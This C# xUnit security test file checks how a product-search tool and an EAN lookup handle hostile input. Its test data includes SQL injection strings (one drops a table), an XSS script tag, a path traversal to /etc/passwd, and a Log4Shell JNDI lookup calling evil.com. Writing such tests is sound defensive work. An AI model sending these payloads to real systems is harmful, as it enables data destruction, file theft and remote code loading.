using FluentAssertions;
using SacksMcp.Tests.Helpers;
using SacksMcp.Tools;
using Sacks.DataAccess.Data;
using Xunit;

namespace SacksMcp.Tests.Security;

/// <summary>
/// Security tests to validate input sanitization and protection against attacks.
/// </summary>
[Trait("Category", "Security")]
public class InputValidationSecurityTests : IDisposable
{
    private readonly SacksDbContext _context;

    public InputValidationSecurityTests()
    {
        _context = MockDbContextFactory.CreateInMemoryContext();
    }

    public void Dispose()
    {
        _context.Dispose();
        GC.SuppressFinalize(this);
    }

    [Theory]
    [InlineData("'; DROP TABLE Products; --")]
    [InlineData("1' OR '1'='1")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("../../etc/passwd")]
    [InlineData("${jndi:ldap://evil.com/a}")]
    public async Task SearchProducts_WithMaliciousInput_DoesNotThrowAndSanitizes(string maliciousInput)
    {
        // Arrange
        var mockLogger = MockDbContextFactory.CreateMockLogger<ProductTools>();
        var tools = new ProductTools(_context, mockLogger.Object);

        // Act
        var act = () => tools.SearchProducts(maliciousInput, 50);

        // Assert - should either return safe results or throw validation exception
        // but never execute malicious code
        await act.Should().NotThrowAsync<InvalidOperationException>("Malicious code should not be executed");
    }

    [Fact]
    public async Task SearchProducts_WithExtremelyLongString_HandlesGracefully()
    {
        // Arrange
        var longString = new string('A', 100000); // 100k characters
        var mockLogger = MockDbContextFactory.CreateMockLogger<ProductTools>();
        var tools = new ProductTools(_context, mockLogger.Object);

        // Act
        var act = () => tools.SearchProducts(longString, 50);

        // Assert - should handle without crashing or timing out
        await act.Should().CompleteWithinAsync(TimeSpan.FromSeconds(5));
    }

    [Theory]
    [InlineData("\0\0\0")]  // Null bytes
    [InlineData("\u0000")]  // Unicode null
    [InlineData("")]        // Empty string (should fail validation)
    public async Task GetProductByEan_WithInvalidCharacters_HandlesCorrectly(string invalidEan)
    {
        // Arrange
        var mockLogger = MockDbContextFactory.CreateMockLogger<ProductTools>();
        var tools = new ProductTools(_context, mockLogger.Object);

        // Act & Assert
        if (string.IsNullOrEmpty(invalidEan))
        {
            await tools.Invoking(t => t.GetProductByEan(invalidEan))
                .Should().ThrowAsync<ArgumentException>();
        }
        else
        {
            // Should not crash, should handle gracefully
            var act = () => tools.GetProductByEan(invalidEan);
            await act.Should().NotThrowAsync<InvalidOperationException>();
        }
    }
}
